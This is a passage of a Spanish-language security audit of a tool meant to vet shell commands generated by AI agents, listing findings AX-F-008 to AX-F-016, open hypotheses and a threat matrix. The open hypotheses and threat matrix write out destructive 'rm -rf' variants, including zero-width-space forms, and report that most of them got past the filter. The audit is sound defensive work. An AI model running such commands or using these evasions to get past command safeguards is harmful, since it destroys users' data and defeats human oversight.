### AX-F-008 — Conflicto de autoridad: la gobernanza declara que no hay runtime; la portada declara protección activa

```yaml
id: AX-F-008
title: El corpus afirma simultáneamente que no existe implementación funcional y que la protección está activa y verificada
category: control_wiring
defect:
  status: CONFIRMED
  certainty: demostración estática concluyente (citas literales contradictorias)
impact:
  status: DEMONSTRATED
  magnitude: MAJOR
severity:
  current: HIGH
  potential: HIGH
control_integrity:
  role: SECURITY_BOUNDARY
  status: UNVERIFIED
current_exposure:
  status: REACHABLE
  consumer: "cualquier lector del README o de index.html; usuario no técnico que decide instalar"
  execution_path: "lectura de README.md / index.html frente a SECURITY.md, GOVERNANCE.md, tools/README.md"
remediation_priority:
  level: P1
  justification: >
    policies/authority.yaml fija `conflict_behavior: FAIL_CLOSED`. Un conflicto de
    autoridad no resuelto sobre la existencia misma del enforcement bloquea cualquier
    conclusión favorable sobre los demás controles.
severity_justification:
  theoretical_risk: "documentación normativa y documentación promocional en direcciones opuestas"
  observed_behavior: |
    SECURITY.md:        "no contiene runtime funcional y no debe utilizarse como
                         control de seguridad efectivo"
    CHANGELOG.md:       "No existe implementación funcional."
    GOVERNANCE.md:      "EXPERIMENTAL y documental. No adquiere enforcement."
    tools/README.md:    "No contiene herramientas ejecutables en la fase fundacional."
                         (el directorio contiene 7 módulos .js ejecutables)
    tests/README.md:    "Actualmente no hay runtime ni suite ejecutable."
                         (el directorio contiene 8 archivos de prueba que ejecutan y pasan)
    adapters/README.md: "Sin código ejecutable." (contiene prompt_bridge.json)
    policies/README.md: "enforcement es DOCUMENT_ONLY"
    --- frente a ---
    README.md:          "Herramientas Ejecutables Incluidas"; "Analiza todo comando
                         generado por la IA en tiempo real (PASS/STOP) evitando
                         roturas de sistema o ejecuciones destructivas"
    index.html:         "GOBERNANZA_ACTIVA"; "VERIFIED_STABLE";
                         "Todos los motores verificados en estado PASS"
    dashboard.html:     "Protección Activa (Fail-Closed)"
  demonstrated_consequence: >
    No es posible determinar a partir del corpus si los componentes son controles
    vigentes o contratos documentales. Un usuario que lea la portada creerá que sus
    comandos destructivos están siendo filtrados; AX-F-005 demuestra que, aun
    invocándolo, el filtro no cubre las formas habituales, y el grep de todo el corpus
    confirma que ningún hook, envoltorio o proceso invoca preflight.js automáticamente.
  matrix_result: "DEMONSTRATED x MAJOR = HIGH"
causal_chain:
  defect: CONFIRMED
  trigger: CONFIRMED
  execution_path: CONFIRMED
  consequence: CONFIRMED
files: [SECURITY.md, GOVERNANCE.md, CHANGELOG.md, tools/README.md, tests/README.md, adapters/README.md, README.md, index.html, tools/dashboard.html]
lines: ["SECURITY.md:5", "tools/README.md:3-5", "tests/README.md:3-5", "README.md:70-80", "index.html:91,274-276"]
evidence:
  type: CODE
  procedure: >
    Lectura íntegra de los 30 documentos del corpus y de los 16 archivos ejecutables;
    búsqueda exhaustiva de consumidores (`require|import|execSync|spawn`) en todos los
    .js y .html del corpus.
  observed_output: >
    Los únicos consumidores de tools/*.js son tools/workflow_runner.js y los 8 archivos
    de tests/. Ninguna interfaz web, hook ni script invoca las herramientas. El
    "enforcement" real es texto instructivo en CLAUDE.md, .claude/CLAUDE.md,
    .agents/AGENTS.md y adapters/prompt_bridge.json dirigido a un agente de IA.
  assumptions: ninguna
  limitations: "no se evaluó si existe integración externa fuera del corpus"
reproduction: "comparar SECURITY.md:5 con index.html:91 y con la etiqueta de dashboard.html:305"
expected: >
  Una única declaración de estado por componente, coherente con policies/promotion.yaml
  ("implementation_implies_approval: false", "documentation_implies_enforcement: false").
observed: "dos declaraciones mutuamente excluyentes, sin resolución ni gate"
minimal_remediation: >
  Decisión escrita de Human Authority sobre el estado real (pre-alpha documental vs.
  runtime experimental) y alineación de README.md, index.html y dashboard.html con esa
  decisión, incluyendo una etiqueta visible de estado experimental en ambas interfaces.
regression_risk: "nulo; es un cambio documental"
remaining_unknowns: "cuál de las dos declaraciones refleja la intención vigente del propietario"
```

---

### AX-F-009 — Las interfaces web simulan la ejecución de los controles y presentan resultados fabricados

```yaml
id: AX-F-009
title: dashboard.html e index.html emiten registros de auditoría y veredictos PASS sin ejecutar ningún control
category: evidence_integrity
defect:
  status: CONFIRMED
  certainty: demostración estática concluyente
impact:
  status: DEMONSTRATED
  magnitude: MODERATE
severity:
  current: MEDIUM
  potential: HIGH
control_integrity:
  role: NOT_A_CONTROL
  status: NOT_APPLICABLE
current_exposure:
  status: REACHABLE
  consumer: "usuario que abre los archivos en un navegador"
  execution_path: "onclick -> appendLog / term.innerText += <cadena literal>"
remediation_priority:
  level: P2
  justification: >
    Información fabricada y efímera, sin persistencia ni consumidor descendente. Sube a
    P1 si el panel llega a presentarse como superficie operativa real, que es lo que su
    propio título afirma.
severity_justification:
  theoretical_risk: "las funciones de la interfaz concatenan cadenas fijas; no invocan ningún módulo"
  observed_behavior: >
    dashboard.html rotula una tarjeta "Registro de Auditoría y Preflight" y emite
    "[5. CONSTRUIR] Ejecutando tools/preflight.js contra sintaxis de comando...",
    "Verificación de comillas y variables: PASS" y "[6. AUDITAR] Hasher SHA-256 emitió
    manifiesto de evidencia", marcando dos nodos del flujo como `verified`. Ninguna de
    esas operaciones ocurre. La cabecera muestra de forma permanente
    "Protección Activa (Fail-Closed)". No hay ninguna etiqueta de simulación.
    index.html declara "VERIFIED_STABLE" y "Todos los motores verificados en estado
    PASS" como texto fijo, aunque sí rotula su consola como "Simulador en Vivo".
  demonstrated_consequence: >
    El usuario recibe un veredicto PASS y un registro de auditoría fabricados. Para el
    público objetivo declarado (no técnico) no hay forma de distinguirlos de una
    ejecución real.
  matrix_result: >
    DEMONSTRATED x MODERATE = MEDIUM. No se eleva a MAJOR porque la salida es texto
    efímero en el DOM, sin persistencia ni consumo por ningún otro componente.
causal_chain:
  defect: CONFIRMED
  trigger: CONFIRMED
  execution_path: CONFIRMED
  consequence: CONFIRMED
files: [tools/dashboard.html, index.html, script.js]
lines: ["dashboard.html:303-306, 382-388, 421-429", "index.html:91, 274-276", "script.js:390-424"]
evidence:
  type: CODE
  procedure: "lectura íntegra de los tres archivos y trazado de cada manejador de eventos"
  observed_output: >
    Las funciones clarifyIntent, selectOption, runPreflightDemo, simulateGit y appendLog
    de dashboard.html contienen exclusivamente literales de cadena. runPreflightDemo y
    runClarifierDemo de script.js son igualmente literales.
  assumptions: ninguna
  limitations: "no se renderizaron las páginas en un navegador; el análisis es estático y concluyente"
reproduction: "abrir tools/dashboard.html y pulsar 'Probar Preflight' sin Node.js instalado: el registro aparece igualmente"
expected: "etiqueta explícita de simulación, o ejecución real de los módulos"
observed: "resultados fabricados presentados como registro de auditoría"
minimal_remediation: >
  Rotular ambas superficies como demostración estática y sustituir "VERIFIED_STABLE",
  "GOBERNANZA_ACTIVA" y "Protección Activa (Fail-Closed)" por el estado real declarado
  en GOVERNANCE.md.
regression_risk: nulo
remaining_unknowns: "ninguno"
```

---

### AX-F-010 — El aclarador emite un Contrato de Entendimiento para una solicitud vaga al llegar al sub-paso 3

```yaml
id: AX-F-010
title: analyzeUserIntent cae por defecto a INTENT_CLARIFIED cuando substep=3, incluso con forceClarification
category: authorization_bypass
defect:
  status: CONFIRMED
  certainty: reproducción directa
impact:
  status: DEMONSTRATED
  magnitude: MODERATE
severity:
  current: MEDIUM
  potential: MEDIUM
control_integrity:
  role: IMPORTANT_CONTROL
  status: BROKEN
current_exposure:
  status: UNREACHABLE
  consumer: "ninguno; ningún llamador del corpus pasa options.substep"
  execution_path: "analyzeUserIntent(texto, {substep:3}) -> los if de substep 1 y 2 no aplican -> return INTENT_CLARIFIED"
remediation_priority:
  level: P2
  justification: >
    Control roto sin ruta de ejecución activa. La API está exportada, por lo que
    cualquier consumidor futuro hereda el defecto. Hallazgo portante latente.
severity_justification:
  theoretical_risk: "el bloque `if (isTooVague)` sólo cubre substep 1 y 2; no hay rama para 3 ni cláusula de cierre"
  observed_behavior: >
    'haz login' con {substep:1} y {substep:2} devuelve NEEDS_CLARIFICATION; con
    {substep:3} y con {substep:3, forceClarification:true} devuelve INTENT_CLARIFIED
    con un contrato construido sobre la misma cadena vaga.
  demonstrated_consequence: >
    El sub-paso 1.3 "Cristalización de Alcance" que .agents/AGENTS.md y la cabecera del
    propio módulo declaran no está implementado, y su ausencia no bloquea: emite el
    contrato. `forceClarification` queda anulado en ese estado.
  matrix_result: "DEMONSTRATED x MODERATE = MEDIUM"
causal_chain:
  defect: CONFIRMED
  trigger: CONFIRMED
  execution_path: CONFIRMED
  consequence: CONFIRMED
files: [tools/intent_clarifier.js]
lines: [107-169]
evidence:
  type: EXPERIMENT
  procedure: "E5. analyzeUserIntent('haz login', opts) variando substep y forceClarification."
  observed_output: |
    opts={"substep":1}                            -> NEEDS_CLARIFICATION
    opts={"substep":2}                            -> NEEDS_CLARIFICATION
    opts={"substep":3}                            -> INTENT_CLARIFIED
    opts={"substep":3,"forceClarification":true}  -> INTENT_CLARIFIED
  assumptions: "substep es un parámetro público del módulo exportado"
  limitations: "ningún consumidor actual lo utiliza; de ahí la exposición UNREACHABLE"
reproduction: |
  node -e "const{analyzeUserIntent}=require('./tools/intent_clarifier.js');
  console.log(analyzeUserIntent('haz login',{substep:3,forceClarification:true}).status)"
  # -> INTENT_CLARIFIED
expected: "implementar el sub-paso 3 o, mientras no exista, bloquear con NEEDS_CLARIFICATION"
observed: "emisión del contrato sobre una intención no cristalizada"
minimal_remediation: >
  Añadir la rama `substep === 3` con las preguntas de alcance y una cláusula final que
  devuelva NEEDS_CLARIFICATION ante cualquier substep no reconocido si isTooVague.
regression_risk: nulo
remaining_unknowns: "ninguno"
```

---

### AX-F-011 — El detector de antipatrones declara una cobertura que no implementa y absuelve el peor defecto del repositorio

```yaml
id: AX-F-011
title: vibeguard.js no implementa el antipatrón nº4 que su cabecera declara y reporta CLEAN el módulo que destruye datos
category: control_wiring
defect:
  status: CONFIRMED
  certainty: reproducción directa
impact:
  status: DEMONSTRATED
  magnitude: MODERATE
severity:
  current: MEDIUM
  potential: MEDIUM
control_integrity:
  role: SUPPORTING_CONTROL
  status: DEGRADED
current_exposure:
  status: REACHABLE
  consumer: "CLI; .agents/AGENTS.md paso 5 lo declara parte de CONSTRUIR & SUPERVISAR"
  execution_path: "node tools/vibeguard.js <archivos>"
remediation_priority:
  level: P2
  justification: "genera confianza infundada sobre la limpieza del código; no es frontera de seguridad"
severity_justification:
  theoretical_risk: "la cabecera enumera 4 comprobaciones; el código implementa 3"
  observed_behavior: >
    Una muestra con un catch que devuelve datos inventados ({usuarios:[],admin:true}),
    un catch que devuelve null y una función `verificar()` que siempre devuelve true
    se clasifica CLEAN con 0 incidencias. En el autoescaneo del propio directorio
    tools/, learning_engine.js (AX-F-006) sale CLEAN, y vibeguard.js se marca a sí
    mismo 3 veces por CSS_OVERRIDE al detectar la cadena '!important' dentro de sus
    propias expresiones regulares.
  demonstrated_consequence: >
    El antipatrón declarado nº4 ("retornos de datos falsos o fallbacks no verificados")
    no existe en el código, que es exactamente la clase a la que pertenece el defecto
    más grave del repositorio. El escáner produce además falsos positivos sobre sí mismo.
  matrix_result: "DEMONSTRATED x MODERATE = MEDIUM"
causal_chain:
  defect: CONFIRMED
  trigger: CONFIRMED
  execution_path: CONFIRMED
  consequence: CONFIRMED
files: [tools/vibeguard.js]
lines: [3-11, 45-77]
evidence:
  type: EXPERIMENT
  procedure: "E10. inspectFileContent sobre una muestra con tres fallbacks no verificados y autoescaneo de tools/*.js."
  observed_output: |
    muestra con 3 fallbacks falsos -> status: CLEAN | issues: 0
    evidence_hasher.js     CLEAN                  issues=0
    git_assistant.js       CLEAN                  issues=0
    intent_clarifier.js    CLEAN                  issues=0
    learning_engine.js     CLEAN                  issues=0     <-- contiene AX-F-006
    preflight.js           CLEAN                  issues=0
    vibeguard.js           ANTIPATTERNS_DETECTED  issues=3      <-- falsos positivos sobre sí mismo
    workflow_runner.js     CLEAN                  issues=0
  assumptions: ninguna
  limitations: "no se evaluó el comportamiento del stripper ante literales de expresión regular que contengan comillas"
reproduction: "node tools/vibeguard.js tools/learning_engine.js  # -> CLEAN"
expected: "implementar la comprobación declarada o retirarla de la documentación del módulo"
observed: "cobertura declarada superior a la real"
minimal_remediation: >
  (a) retirar el punto 4 de la cabecera o implementarlo (catch cuyo cuerpo sea
  únicamente un return de literal); (b) excluir de CSS_OVERRIDE las coincidencias que
  el propio stripper haya marcado como interior de literal.
regression_risk: "bajo; tests/vibeguard.test.js asevera totalIssues === 3 sobre una muestra fija"
remaining_unknowns: "ninguno"
```

---

### AX-F-012 — La suite de pruebas certifica los comportamientos defectuosos y contiene aserciones tautológicas

```yaml
id: AX-F-012
title: Las pruebas que declaran validar fallo cerrado consagran el fallo abierto, no ejercitan lo que anuncian y afirman resultados falsos
category: evidence_integrity
defect:
  status: CONFIRMED
  certainty: demostración estática concluyente + ejecución de los 8 archivos
impact:
  status: DEMONSTRATED
  magnitude: MODERATE
severity:
  current: MEDIUM
  potential: HIGH
control_integrity:
  role: IMPORTANT_CONTROL
  status: BROKEN
current_exposure:
  status: EXECUTED
  consumer: "operador humano que interpreta la salida verde como verificación"
  execution_path: "node tests/*.js -> exit 0 -> 'TODAS LAS PRUEBAS PASARON EXITOSAMENTE'"
remediation_priority:
  level: P2
  justification: >
    Es la causa por la que los defectos HIGH sobreviven: la suite no puede detectarlos
    porque los certifica. Prioridad inmediatamente posterior a los defectos que oculta.
severity_justification:
  theoretical_risk: "aserciones escritas sobre el comportamiento observado, no sobre el requisito"
  observed_behavior: |
    adversarial.test.js:41  asevera manifest.metadata.status === 'APPROVED' para un
                            archivo INEXISTENTE y anuncia "generó hash de resguardo
                            seguro ante archivos inexistentes (PASS)". No se genera
                            ningún hash de resguardo: el archivo se descarta en silencio.
    adversarial.test.js:56  usa scratch/ como "directorio no-git", pero scratch/ está
                            DENTRO del repositorio git; la única aserción es
                            `typeof gitDiag.status === 'string'`, que no puede fallar.
    adversarial.test.js:7   importa `generateSHA256`, símbolo que evidence_hasher.js no
                            exporta (queda undefined; nunca se invoca).
    learning_git.test.js:34 asevera `typeof ... === 'string'` (tautológica).
    workflow.test.js        prueba el GATE sólo con los literales 'HIGH'/'CRITICAL'.
    tools.test.js:7         se titula "ZetProG Migrated Safe Tools", mientras
                            docs/non_goals.md prohíbe "incorporar código ejecutable de
                            ZetProG" y archive_manifest afirma "No se importó material
                            de ZetProG".
    README.md               documenta 5 de los 8 archivos de prueba; adversarial,
                            vibeguard y human_anti_patterns quedan fuera del comando
                            publicado.
  demonstrated_consequence: >
    Los 8 archivos terminan con código de salida 0 y el mensaje "TODAS LAS PRUEBAS
    PASARON EXITOSAMENTE (PASS)" mientras conviven 6 hallazgos HIGH. La suite verde
    constituye evidencia materialmente engañosa sobre el estado del sistema.
  matrix_result: "DEMONSTRATED x MODERATE = MEDIUM"
causal_chain:
  defect: CONFIRMED
  trigger: CONFIRMED
  execution_path: CONFIRMED
  consequence: CONFIRMED
files: [tests/adversarial.test.js, tests/learning_git.test.js, tests/workflow.test.js, tests/tools.test.js, README.md]
lines: ["adversarial.test.js:7,35-43,54-59", "learning_git.test.js:33-36", "workflow.test.js:27-39", "README.md:96-100"]
evidence:
  type: EXPERIMENT
  procedure: "ejecución de los 8 archivos de prueba en la copia aislada y lectura íntegra de cada aserción"
  observed_output: "8/8 exit code 0; 0 fallos; ninguna aserción cubre las clases de AX-F-001..AX-F-007"
  assumptions: ninguna
  limitations: "sin instrumentación no puede medirse qué fracción de las ramas queda sin ejercitar"
reproduction: "node tests/adversarial.test.js  # PASS con manifiesto vacío y APPROVED"
expected: >
  Que una prueba adversaria falle ante un manifiesto que descarta archivos en silencio
  y ante un gate que se omite con 'high'.
observed: "las pruebas aseveran el comportamiento defectuoso como correcto"
minimal_remediation: >
  Reescribir las aserciones contra el requisito (§AGENTS.md), no contra la salida
  observada; sustituir las tautológicas por comprobaciones de valor; corregir el
  directorio no-git; eliminar el import inexistente; publicar los 8 archivos en el README.
regression_risk: "alto por diseño: las pruebas corregidas fallarán hasta que se remedien AX-F-002/003/004"
remaining_unknowns: "ninguno"
```

---

### AX-F-013 — El preflight bloquea comandos legítimos con apóstrofos

```yaml
id: AX-F-013
title: El balance de comillas simples produce STOP sobre comandos correctos que contienen apóstrofos
category: oversized_inputs
defect: {status: CONFIRMED, certainty: reproducción directa}
impact: {status: DEMONSTRATED, magnitude: MINOR}
severity: {current: LOW, potential: LOW}
control_integrity: {role: SECURITY_BOUNDARY, status: DEGRADED}
current_exposure: {status: INDIRECT, consumer: "agente que sigue CLAUDE.md", execution_path: "runPreflight check 1"}
remediation_priority: {level: P3, justification: "fricción operativa; el fallo es cerrado y recuperable"}
severity_justification:
  theoretical_risk: "conteo global de comillas sin considerar anidamiento ni escapes"
  observed_behavior: "echo \"it's fine\" -> STOP: «Comillas simples (') desbalanceadas»"
  demonstrated_consequence: "comandos correctos rechazados; presión para desactivar el control"
  matrix_result: "DEMONSTRATED x MINOR = LOW"
causal_chain: {defect: CONFIRMED, trigger: CONFIRMED, execution_path: CONFIRMED, consequence: CONFIRMED}
files: [tools/preflight.js]
lines: [26-45]
evidence:
  type: EXPERIMENT
  procedure: "E2b sobre tres comandos legítimos"
  observed_output: |
    PASS | git commit -m "no rompas esto"
    STOP | echo "it's fine"   <- Comillas simples (') desbalanceadas en el comando.
    PASS | node -e "console.log('ok')"
  assumptions: ninguna
  limitations: "no se cuantificó la frecuencia en uso real"
reproduction: 'node tools/preflight.js "echo \"it'"'"'s fine\""'
expected: "no contabilizar comillas simples dentro de un literal de comillas dobles"
observed: STOP
minimal_remediation: "recorrer la cadena con una máquina de estados de literales en lugar de contar globalmente"
regression_risk: bajo
remaining_unknowns: ninguno
```

---

### AX-F-014 — Identificadores de evidencia con colisión observada y doble identidad en el mismo manifiesto

```yaml
id: AX-F-014
title: evidence_id con 9000 valores posibles colisiona; el manifiesto contiene además un segundo identificador distinto
category: evidence_integrity
defect: {status: CONFIRMED, certainty: reproducción directa}
impact: {status: DEMONSTRATED, magnitude: MODERATE}
severity: {current: MEDIUM, potential: MEDIUM}
control_integrity: {role: SUPPORTING_CONTROL, status: DEGRADED}
current_exposure: {status: REACHABLE, consumer: "cualquier consumidor del manifiesto", execution_path: "createEvidenceManifest"}
remediation_priority: {level: P2, justification: "degrada la trazabilidad exigida por policies/retention.yaml"}
severity_justification:
  theoretical_risk: "Math.floor(1000 + Math.random()*9000) sobre un espacio de 9000 valores"
  observed_behavior: "400 manifiestos -> 391 identificadores únicos; primera colisión en la generación nº 94"
  demonstrated_consequence: >
    Dos manifiestos distintos pueden compartir evidence_id. Además, metadata.identity
    (AX-EVI-<epoch ms>) y evidence_id (AX-EVI-<4 dígitos>) son valores distintos dentro
    del mismo documento, y el log del paso 6 del workflow referencia el primero mientras
    el esquema exige el segundo.
  matrix_result: "DEMONSTRATED x MODERATE = MEDIUM"
causal_chain: {defect: CONFIRMED, trigger: CONFIRMED, execution_path: CONFIRMED, consequence: CONFIRMED}
files: [tools/evidence_hasher.js]
lines: [65-87]
evidence:
  type: EXPERIMENT
  procedure: "E6. Generación de 400 manifiestos consecutivos y recuento de identificadores únicos."
  observed_output: "400 manifiestos generados -> ids unicos: 391 | primera colision en la generacion # 94"
  assumptions: "Math.random() con la semilla por defecto de V8"
  limitations: "resultado estocástico; el orden exacto de la primera colisión varía entre ejecuciones"
reproduction: "generar N manifiestos y contar Set(evidence_id).size"
expected: "identificador único y estable (crypto.randomUUID o hash del contenido)"
observed: "colisión a las ~94 generaciones y doble identidad"
minimal_remediation: "usar crypto.randomUUID() y un único campo de identidad alineado con el esquema"
regression_risk: "bajo; tests/adversarial.test.js sólo comprueba `typeof === 'string'`"
remaining_unknowns: ninguno
```

---

### AX-F-015 — El instalador informa un recuento fijo de archivos y SUCCESS aunque la instalación sea parcial

```yaml
id: AX-F-015
title: runInstallation devuelve filesCount:11 y SUCCESS con independencia de cuántos archivos copie realmente
category: partial_failure
defect: {status: CONFIRMED, certainty: reproducción directa}
impact: {status: DEMONSTRATED, magnitude: MODERATE}
severity: {current: MEDIUM, potential: MEDIUM}
control_integrity: {role: NOT_A_CONTROL, status: NOT_APPLICABLE}
current_exposure: {status: EXECUTED, consumer: "usuario final", execution_path: "node install.js"}
remediation_priority: {level: P2, justification: "informa un estado de instalación que no corresponde al resultado"}
severity_justification:
  theoretical_risk: "literal 11 en el objeto de retorno; cada copia va guardada tras un existsSync silencioso"
  observed_behavior: >
    Con 5 de las 11 fuentes ausentes se inyectaron 6 archivos; el retorno fue
    {status:'SUCCESS', filesCount:11} y el mensaje final "Instalación completada
    exitosamente". Además se crea `schemas/` en el destino y nunca se copia nada dentro
    (directorio vacío confirmado).
  demonstrated_consequence: >
    Instalación parcial reportada como completa, sin atomicidad, sin verificación
    posterior, sin dry-run y sin rollback. Contradice policies/risk.yaml, que exige
    `rollback_plan` para acciones de persistencia HIGH.
  matrix_result: "DEMONSTRATED x MODERATE = MEDIUM"
causal_chain: {defect: CONFIRMED, trigger: CONFIRMED, execution_path: CONFIRMED, consequence: CONFIRMED}
files: [install.js]
lines: [22-28, 33-80, 85-89]
evidence:
  type: EXPERIMENT
  procedure: "E8b. Copia del origen con 5 fuentes eliminadas; ejecución del instalador contra un destino limpio."
  observed_output: |
    archivos realmente inyectados ...: 6
    filesCount reportado ............: 11
    status reportado ................: SUCCESS
    schemas/ creado pero vacio ......: true
  assumptions: ninguna
  limitations: "no se evaluó el fallo a mitad por permisos o disco lleno"
reproduction: "eliminar tools/preflight.js del origen y ejecutar install.js: sigue reportando 11"
expected: "recuento real, estado PARTIAL o FAILED ante fuentes ausentes, y rollback"
observed: "SUCCESS con recuento fijo"
minimal_remediation: >
  Contar las copias efectivas, devolver PARTIAL_INSTALL cuando falte alguna fuente,
  y no crear directorios que no se van a poblar.
regression_risk: "nulo; tests/install.test.js no comprueba filesCount"
remaining_unknowns: ninguno
```

---

### AX-F-016 — Recursos externos en un producto que declara cero dependencias

```yaml
id: AX-F-016
title: Las dos interfaces web cargan tipografías desde dominios de terceros y ninguna declara CSP
category: supply_chain
defect: {status: CONFIRMED, certainty: demostración estática}
impact: {status: NO_OBSERVED_IMPACT, magnitude: MINOR}
severity: {current: LOW, potential: MEDIUM}
control_integrity: {role: NOT_A_CONTROL, status: NOT_APPLICABLE}
current_exposure: {status: REACHABLE, consumer: "navegador del usuario", execution_path: "<link rel=stylesheet href=fonts.googleapis.com>"}
remediation_priority: {level: P4, justification: "endurecimiento; sin impacto observado en uso local"}
severity_justification:
  theoretical_risk: "dependencia de red de terceros y ausencia de política de contenido"
  observed_behavior: >
    index.html:8-10 y tools/dashboard.html:7-9 cargan fonts.googleapis.com y
    fonts.gstatic.com. Ninguno de los dos declara Content-Security-Policy. No hay
    scripts de terceros, ni CDN de JavaScript, ni uso de innerHTML/eval en todo el
    corpus (verificado por búsqueda exhaustiva); toda la escritura de DOM usa innerText.
  demonstrated_consequence: >
    Ninguna en uso local. Se registra por contradicción con el principio declarado de
    cero dependencias externas y porque el corpus no contiene fallback tipográfico
    verificado si el dominio no responde.
  matrix_result: "NO_OBSERVED_IMPACT x MINOR = LOW"
causal_chain: {defect: CONFIRMED, trigger: CONFIRMED, execution_path: CONFIRMED, consequence: ABSENT}
files: [index.html, tools/dashboard.html]
lines: ["index.html:8-10", "dashboard.html:7-9"]
evidence:
  type: CODE
  procedure: "enumeración exhaustiva de URLs http(s) en todos los .html/.js/.json/.md/.yaml del corpus"
  observed_output: "2 archivos con Google Fonts; 10 URIs $schema de json-schema.org que nunca se descargan; 0 scripts externos"
  assumptions: ninguna
  limitations: "no se verificó el comportamiento con la red desconectada"
reproduction: "grep de href https en index.html y tools/dashboard.html"
expected: "tipografías autoalojadas o pila del sistema, coherentes con Zero-Bloat"
observed: "dos dominios de terceros"
minimal_remediation: "autoalojar las fuentes o usar system-ui; añadir una meta CSP restrictiva"
regression_risk: nulo
remaining_unknowns: "ninguno"
```

---

## 7. Hipótesis abiertas (no son hallazgos numerados)

```yaml
open_hypotheses:
  - id: H-01
    claim: "Los caracteres invisibles permiten evadir el filtro con un comando que aún se ejecute"
    status: NO_CONFIRMADA
    observed: >
      'rm -rf\u200b /' y 'r\u200bm -rf /' devuelven PASS (brecha léxica real). Sin
      embargo no se demostró que esas cadenas ejecuten la operación destructiva en un
      shell real: el ZWSP corrompe el flag o el verbo. U+00A0 sí es detenido (\s de
      JS lo cubre) y U+2044 no es un separador de rutas.
    needed_to_confirm: "una variante con carácter invisible que preserve la semántica de ejecución"
  - id: H-02
    claim: "TOCTOU en createEvidenceManifest entre existsSync/statSync y readFileSync"
    status: NO_VERIFICADA
    observed: "la secuencia es susceptible por construcción; no se construyó una carrera reproducible"
  - id: H-03
    claim: "hashFile sigue enlaces simbólicos y puede firmar un objetivo distinto al declarado"
    status: NO_VERIFICADA
    observed: "readFileSync sigue enlaces por defecto; no se probó en NTFS con symlink/junction"
  - id: H-04
    claim: "script.js:343 lanza TypeError si un .cmd-item carece de data-action"
    status: PLAUSIBLE
    observed: "`action.startsWith` sin comprobación de null; los 6 elementos actuales sí lo declaran"
  - id: H-05
    claim: "El stripper léxico de vibeguard confunde literales de expresión regular con literales de cadena"
    status: PLAUSIBLE
    observed: "una regex que contenga una comilla abriría un estado de cadena espurio; no se construyó el caso"
```

---

## 8. Refutaciones internas de la Fase A

```yaml
refuted:
  - previous_claim: "El stripper léxico de vibeguard desincroniza los números de línea reportados"
    original_basis: "las ramas del stripper añaden 1 o 2 caracteres por iteración; se sospechó desfase de índices"
    refutation_method: "E10. Muestra con comentario multilínea + literal con llaves + catch mudo en la línea 5"
    observed_result: "vibeguard reporta línea 5; la longitud se conserva en todas las ramas"
    corrected_conclusion: "el mapeo de índice a línea es correcto"
    affected_verdict: "ninguno; retirada antes de convertirse en hallazgo"

  - previous_claim: "Ejecutar `node install.js` en el propio directorio del proyecto corrompe o trunca los archivos por autocopia"
    original_basis: "copyFileSync con origen y destino idénticos cuando targetDir === __dirname"
    refutation_method: "E8c. Copia espejo del corpus; ejecución de `node install.js` en su raíz"
    observed_result: "sin excepción; CLAUDE.md conserva 686 bytes antes y después"
    corrected_conclusion: "la autocopia es inocua en este entorno; AX-F-001 se limita a destinos con contenido ajeno"
    affected_verdict: "reduce el alcance de AX-F-001; no lo elimina"

  - previous_claim: "preflight.js es vulnerable a ReDoS o bloquea el bucle de eventos con entradas grandes"
    original_basis: "cuatro expresiones regulares aplicadas a una cadena no acotada"
    refutation_method: "E12b. Entradas de 10^4, 10^5 y 10^6 caracteres, más 20 000 comillas consecutivas"
    observed_result: "3,17 ms para 1 MB; 0,13 ms para el caso patológico. Comportamiento lineal"
    corrected_conclusion: "sin ReDoS ni bloqueo; las expresiones no tienen retroceso catastrófico"
    affected_verdict: "clase `regex_dos` y `event_loop_blocking` de la matriz cerradas como NO_ENCONTRADO"

  - previous_claim: "El eco de secuencias ANSI en el campo `command` permite inyección en la terminal"
    original_basis: "runPreflight devuelve la cadena recibida sin sanear"
    refutation_method: "E12a. runPreflight con prefijo \\u001b[31m; inspección de la salida del CLI"
    observed_result: "la salida del CLI pasa por JSON.stringify, que escapa los caracteres de control"
    corrected_conclusion: "no hay inyección por la ruta publicada; el riesgo persiste sólo si un consumidor imprime .command en crudo"
    affected_verdict: "degradado a nota de la matriz de amenazas"
```

```yaml
self_correction:
  - previous_claim: "(arnés propio) el script de experimentos E3 estaba correcto"
    corrected_claim: "el arnés fallaba con TypeError al formatear risk=undefined"
    cause_of_error: "JSON.stringify(undefined) devuelve undefined, no una cadena"
    new_evidence: "traza de node en la primera ejecución de exp_controls.js"
    methodological_change: "envolver todo formateo en String(); el defecto era del comprobador, no del artefacto (clasificación VERIFIER_DEFECT por regla C9)"
    correction_type: FACTUAL_CORRECTION
```

---

## 9. Matriz obligatoria de amenazas

```yaml
threat_matrix:
  destructive_operations:
    tested: true
    method: "20 variantes contra runPreflight (E2); instalador contra destino con contenido (E8a)"
    result: "AX-F-005 (17/20 no detenidos), AX-F-001 (sobrescritura sin respaldo)"
    limitations: "no se ejecutó ningún comando destructivo real"
  authorization_bypass:
    tested: true
    method: "10 variantes del campo risk (E3); substep del aclarador (E5)"
    result: "AX-F-002 (fail-open), AX-F-010 (caída por defecto)"
    limitations: "sin consumidor de producción, la explotación queda en el plano de la API"
  control_wiring:
    tested: true
    method: "búsqueda exhaustiva de require/import/execSync/spawn en todos los .js y .html"
    result: "AX-F-008. Ningún control se invoca automáticamente; el enforcement es texto para un agente"
    limitations: "no se evaluó integración externa fuera del corpus"
  path_traversal:
    tested: true
    method: "E12d. Rutas relativas con ../ y absolutas fuera del proyecto en createEvidenceManifest"
    result: "acepta rutas externas y registra '../secreto_externo.txt'; no declara raíz de proyecto"
    limitations: "es un CLI que el operador invoca deliberadamente; no hay entrada remota. Registrado como endurecimiento, no como hallazgo"
  symlinks:
    tested: false
    method: "no ejecutado"
    result: NOT_VERIFIABLE
    limitations: "H-03 permanece abierta; crear enlaces en NTFS requiere privilegios no disponibles"
  toctou:
    tested: false
    method: "análisis estático únicamente"
    result: "secuencia susceptible en evidence_hasher.js:45-52 (H-02)"
    limitations: "no se construyó una carrera reproducible"
  unicode:
    tested: true
    method: "E12a. 7 variantes (U+00A0, U+200B, U+2044, escapes ANSI)"
    result: "brecha léxica confirmada; explotabilidad no demostrada (H-01)"
    limitations: "sin ejecución en shell real"
  invisible_characters:
    tested: true
    method: "E12a"
    result: "U+200B no es normalizado por preflight"
    limitations: "igual que unicode"
  ansi_escape:
    tested: true
    method: "E12a"
    result: "REFUTADO por la ruta CLI (JSON.stringify escapa los controles)"
    limitations: "riesgo residual si un consumidor imprime .command en crudo"
  command_injection:
    tested: true
    method: "revisión de todo uso de child_process en el corpus"
    result: >
